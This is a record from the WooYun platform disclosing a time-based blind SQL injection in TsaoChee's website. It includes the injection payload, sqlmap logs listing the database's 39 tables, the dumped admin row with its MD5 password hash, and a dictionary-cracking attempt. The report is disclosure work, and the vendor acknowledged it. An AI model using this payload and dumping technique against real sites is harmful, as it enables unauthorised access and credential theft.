{"id": 77826, "wybug_id": "wooyun-2015-0161729", "wybug_title": "TsaoChee官网SQL注入漏洞（涉及39表+管理员cmd5）（臺灣地區）", "wybug_corp": "TsaoChee", "wybug_author": "路人甲", "wybug_date": "2015-12-16 11:53", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向公众公开  简要描述： 坑啊 为了注出管理员，从昨天4点sqlmap跑到今天早上，延时注入最恶心的是居然还解不出，你个管理员好好的设置那么难的密码干啥 详细说明：  是不是太美，官网地址\n\n注入点：\n**.**.**.**/newsinfo.php?id=18&catid=1\n简单and 1=1 and 1=2 测试发现不一样所以直接丢进sqlmap\nPlace: GETParameter: id    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=18) AND SLEEP(5) AND (1892=1892&catid=1---[18:27:01] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[18:27:01] [INFO] fetching current user[18:27:01] [INFO] retrieved:[18:27:01] [WARNING] it is very important not to stress the network adapter'sndwidth during usage of time-based queries[18:27:17] [INFO] adjusting time delay to 4 seconds due to good response timestsaochee_maindb@localhostcurrent user:    'tsaochee_maindb@localhost'\n\n[18:46:32] [WARNING] increasing time delay to 4 secondsaochee_maindbavailable databases [1]:[*] tsaochee_maindb\n39个表，时间盲注太慢了，我直接跑出重要表段\n[18:52:59] [INFO] retrieved:[18:53:11] [INFO] adjusting time delay to 4 seconds due to good39[18:53:33] [INFO] retrieved: st_address[18:57:27] [ERROR] invalid character detected. retrying..[18:57:27] [WARNING] increasing time delay to 5 seconds_area[18:59:23] [INFO] retrieved: st_address_city[19:02:12] [INFO] retrieved: st_admin_group[19:06:59] [INFO] retrieved: st_admin_menu[19:09:51] [INFO] retrieved: st_admin_menulist[19:13:10] [ERROR] invalid character detected. retrying..[19:13:10] [WARNING] increasing time delay to 6 seconds[19:13:14] [INFO] retrieved: st_admin_permisions[19:19:44] [ERROR] invalid character detected. retrying..[19:19:44] [WARNING] increasing time delay to 7 seconds[19:19:48] [INFO] retrieved: st_admin_user[19:23:14] [INFO] retrieved: st_album_cat[19:28:24] [ERROR] invalid character detected. retrying..[19:28:24] [WARNING] increasing time delay to 8 seconds[19:28:29] [INFO] retrieved: st_al\n\nst_admin_user\n\nDatabase: tsaochee_maindb[39 tables]+----------------------+| `st_interview\\x03`   || st_address_area      || st_address_city      || st_admin_group       || st_admin_menu        || st_admin_menulist    || st_admin_permisions  || st_admin_user        || st_album_cat         || st_album_cat_list    || st_album_pic         || st_appli             || st_application       || st_application2      || st_application3      || st_article           || st_article_cat       || st_banner            || st_banner_cat        || st_carewin           || st_classes           || st_classes_datelistH || st_event_cat         || st_event_cat_list    || st_index_about       || st_life              || st_mail_tpl          || st_member            || st_news              || st_news_cat          || st_pdt_banner        || st_product           || st_product_cat       || st_service           || st_share             || st_site_basic        || st_site_global       || st_site_meta         || st_suuermqn          |+----------------------+\n擦为了管理员密码 搞的这么晚\nse 'tsaochee_maindb'[00:13:49] [INFO] resumed: 1[00:13:49] [INFO] retrieved:[00:13:52] [INFO] retrieved:[00:13:56] [INFO] retrieved: admin[00:14:55] [INFO] retrieved: 0[00:15:12] [INFO] retrieved: 1[00:15:24] [INFO] retrieved:[00:15:27] [INFO] retrieved: 0[00:15:45] [INFO] retrieved:[00:15:48] [INFO] retrieved: admin[00:16:47] [INFO] retrieved: 0[00:17:04] [INFO] retrieved: 0[00:17:24] [ERROR] invalid character detected. retrying..[00:17:24] [WARNING] increasing time delay to 3 seconds9f735a0e7134c506098cc2929[00:23:36] [ERROR] invalid character detected. retrying..[00:23:36] [WARNING] increasing time delay to 4 seconds75d249[00:25:27] [INFO] analyzing table dump for possible password hashesrecognized possible password hashes in column 'password'. Do you want to chem via a dictionary-based attack? [Y/n/q] y[00:28:42] [INFO] using hash method 'md5_generic_passwd'what dictionary do you want to use?[1] default dictionary file 'E:\\sqlmap\\sqlmap\\Bin\\txt\\wordlist.txt' (press)[2] custom dictionary file[3] file with list of dictionary files>[00:28:47] [INFO] using default dictionary[00:28:47] [INFO] loading dictionary from 'E:\\sqlmap\\sqlmap\\Bin\\txt\\wordli'do you want to use common password suffixes? (slow!) [y/N] y[00:28:51] [INFO] starting dictionary-based cracking (md5_generic_passwd)[00:28:51] [WARNING] multiprocessing hash cracking is currently not suppor this platform[00:29:13] [INFO] using suffix '1'[00:29:18] [INFO] current status: a1soh... /\n\n[1 entry]+------------+-------------+---------+---------+----+-------+-----------+-----------+----------+--------+----------------------------------+| `\\x7ftime` | `lastlo?in` | account | groupid | id | jmail | loadlevel | logincode | nickname | online | password                         |+------------+-------------+---------+---------+----+-------+-----------+-----------+----------+--------+----------------------------------+| <blank>    | <blank>     | admin   | 0       | 1  | <blank> | 0         | <blank>   | admin    | 0      | 09f735a0e7134c506098cc292975d249 |+------------+-------------+---------+---------+----+-------+-----------+-------\n问了社区，都解不出了   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-12-18 13:51 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-18 13:51 |    \t\tHitcon台湾互联网漏洞报告平台(乌云厂商)\t\t \n   WooYun: TsaoChee官网SQL注入漏洞 已有回報！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}